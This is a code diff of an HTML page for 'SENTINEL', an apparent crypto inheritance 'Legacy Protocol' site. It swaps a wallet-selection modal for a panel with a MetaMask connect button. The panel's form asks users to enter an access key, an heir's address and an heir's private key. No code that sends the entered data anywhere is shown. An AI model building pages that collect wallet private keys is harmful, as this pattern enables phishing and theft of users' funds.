@@ -3,124 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SENTINEL | Web3 Vault System</title>
+    <title>SENTINEL | Legacy Protocol</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        :root { --neon: #00f2ff; --glass-dark: rgba(0, 0, 0, 0.9); }
+        :root { --neon: #00f2ff; --glass: rgba(15, 20, 25, 0.85); --border: rgba(0, 242, 255, 0.2); }
         * { box-sizing: border-box; transition: 0.3s; font-family: 'Inter', sans-serif; }
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; background: #000; color: white; overflow-x: hidden; }
+        body { margin: 0; background: #000; color: white; overflow-x: hidden; }
 
-        .main-bg {
-            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.6)), url('vault.jpg') no-repeat center center fixed;
-            background-size: cover; min-height: 100vh; display: flex; flex-direction: column; align-items: center;
+        .vault-bg {
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.7)), url('vault.jpg') no-repeat center center fixed;
+            background-size: cover; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px;
         }
 
-        /* Navigasyon */
-        nav { width: 100%; max-width: 1200px; display: flex; justify-content: space-between; align-items: center; padding: 25px; }
-        .logo { width: 45px; filter: drop-shadow(0 0 10px var(--neon)); }
-
-        /* Cüzdan Butonu */
-        .connect-btn {
-            background: transparent; border: 1px solid var(--neon); color: var(--neon);
-            padding: 10px 20px; border-radius: 50px; cursor: pointer; font-weight: bold; font-size: 0.75rem;
+        /* Ana Panel (Glassmorphism) */
+        .main-panel {
+            background: var(--glass); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--border); border-radius: 35px; padding: 40px;
+            width: 100%; max-width: 500px; text-align: center; margin-top: 50px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.8);
         }
-        .connect-btn:hover { background: var(--neon); color: black; box-shadow: 0 0 15px var(--neon); }
 
-        .hero { text-align: center; margin-top: 100px; padding: 20px; }
-        h1 { font-size: 4rem; letter-spacing: -2px; margin: 0; font-weight: 900; }
-        .sub { color: var(--neon); letter-spacing: 5px; font-size: 0.8rem; margin-top: 10px; text-transform: uppercase; }
+        .logo-small { width: 60px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--neon)); }
+        
+        /* Form Elemanları */
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { font-size: 0.7rem; color: var(--neon); letter-spacing: 2px; font-weight: bold; margin-left: 5px; }
+        input {
+            width: 100%; padding: 15px; margin-top: 8px; background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; outline: none;
+        }
+        input:focus { border-color: var(--neon); background: rgba(0,242,255,0.02); }
 
-        /* Modal Yapısı */
-        .modal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95);
-            display: none; justify-content: center; align-items: center; z-index: 2000; backdrop-filter: blur(10px);
+        /* Butonlar */
+        .btn-connect {
+            width: 100%; padding: 18px; background: var(--neon); color: black; border: none;
+            border-radius: 12px; font-weight: 900; letter-spacing: 1px; cursor: pointer; margin-bottom: 30px;
         }
-        .panel-card {
-            background: var(--glass-dark); border: 1px solid var(--neon); border-radius: 30px;
-            width: 90%; max-width: 450px; padding: 40px; text-align: center; position: relative;
-        }
-        .close { position: absolute; top: 20px; right: 25px; font-size: 2rem; cursor: pointer; }
+        .btn-connect:hover { box-shadow: 0 0 30px var(--neon); transform: scale(1.02); }
 
-        .wallet-option {
-            display: flex; align-items: center; justify-content: space-between;
-            padding: 15px; background: rgba(255,255,255,0.05); border-radius: 12px;
-            margin: 10px 0; border: 1px solid rgba(255,255,255,0.1); cursor: pointer;
+        .btn-save {
+            width: 100%; padding: 15px; background: transparent; border: 1px solid var(--neon);
+            color: var(--neon); border-radius: 12px; font-weight: bold; cursor: pointer;
         }
-        .wallet-option:hover { border-color: var(--neon); background: rgba(0, 242, 255, 0.05); }
+        .btn-save:hover { background: var(--neon); color: black; }
+
+        .status-dot { width: 8px; height: 8px; background: #0f0; border-radius: 50%; display: inline-block; margin-right: 8px; }
     </style>
 </head>
 <body>
 
-<div class="main-bg">
-    <nav>
-        <img src="logo.png" alt="SNTL" class="logo">
-        <div>
-            <button class="connect-btn" id="walletBtn" onclick="openWalletModal()">CONNECT WALLET</button>
-        </div>
-    </nav>
+<div class="vault-bg">
+    <div class="main-panel">
+        <img src="logo.png" alt="SNTL" class="logo-small">
+        <h2 style="margin: 0; letter-spacing: -1px;">LEGACY CONTROL</h2>
+        <p style="font-size: 0.8rem; color: #777; margin-bottom: 30px;">Secure inheritance protocol for 500M $SNTL ecosystem.</p>
 
-    <div class="hero">
-        <h1>SENTINEL</h1>
-        <div class="sub">Decentralized Legacy System</div>
-        <p style="color: #888; margin-top: 30px;">Initialize your secure vault by connecting your wallet.</p>
-    </div>
-</div>
+        <button class="btn-connect" id="walletBtn" onclick="connectWallet()">CONNECT WALLET</button>
 
-<div class="modal" id="walletModal">
-    <div class="panel-card">
-        <span class="close" onclick="closeModal()">&times;</span>
-        <h2 style="margin-bottom: 30px;">CONNECT WALLET</h2>
-        
-        <div class="wallet-option" onclick="connectMetaMask()">
-            <span>MetaMask</span>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Manifest_Icon.svg" width="30">
-        </div>
-        
-        <div class="wallet-option">
-            <span>Trust Wallet</span>
-            <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" width="30">
+        <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.05); margin-bottom: 30px;">
+
+        <div class="input-group">
+            <label>USER ACCESS KEY</label>
+            <input type="password" placeholder="••••••••••••••••">
         </div>
 
-        <div class="wallet-option">
-            <span>WalletConnect</span>
-            <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg" width="30">
+        <div class="input-group">
+            <label>HEIR WALLET ADDRESS (MİRASÇI)</label>
+            <input type="text" placeholder="0x...">
         </div>
 
-        <p id="status" style="font-size: 0.7rem; color: #555; margin-top: 20px;">Support: Ethereum & Arbitrum Networks</p>
+        <div class="input-group">
+            <label>HEIR PRIVATE KEY (ENCRYPTED)</label>
+            <input type="password" placeholder="Mirasçı erişim anahtarı">
+        </div>
+
+        <button class="btn-save">INITIALIZE LEGACY TRANSFER</button>
+
+        <div style="margin-top: 30px; font-size: 0.6rem; color: #444; letter-spacing: 2px;">
+            <span class="status-dot"></span> PROTOCOL_ACTIVE_V11.0
+        </div>
     </div>
 </div>
 
 <script>
-    function openWalletModal() { document.getElementById('walletModal').style.display = 'flex'; }
-    function closeModal() { document.getElementById('walletModal').style.display = 'none'; }
-
-    // MetaMask Bağlantı Fonksiyonu
-    async function connectMetaMask() {
-        const status = document.getElementById('status');
+    async function connectWallet() {
         const btn = document.getElementById('walletBtn');
-
         if (window.ethereum) {
             try {
-                status.innerText = "Connecting...";
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const account = accounts[0];
-                
-                // Adresi kısalt (Örn: 0x123...456)
-                const shortAddr = account.substring(0, 6) + "..." + account.substring(account.length - 4);
-                
-                btn.innerText = shortAddr; // Buton ismini adres yap
-                btn.style.background = "#00f2ff";
-                btn.style.color = "black";
-                
-                status.innerText = "Wallet Connected Successfully!";
-                setTimeout(closeModal, 1500);
-            } catch (error) {
-                status.innerText = "Connection Rejected!";
-                console.error(error);
+                btn.innerText = account.substring(0, 6) + "..." + account.substring(account.length - 4);
+                btn.style.boxShadow = "0 0 20px rgba(0,242,255,0.5)";
+            } catch (err) {
+                alert("Bağlantı reddedildi.");
             }
         } else {
-            status.innerText = "MetaMask not found! Please install it.";
-            window.open('https://metamask.io/download/', '_blank');
+            alert("Lütfen MetaMask yükleyin.");
         }
     }
 </script>
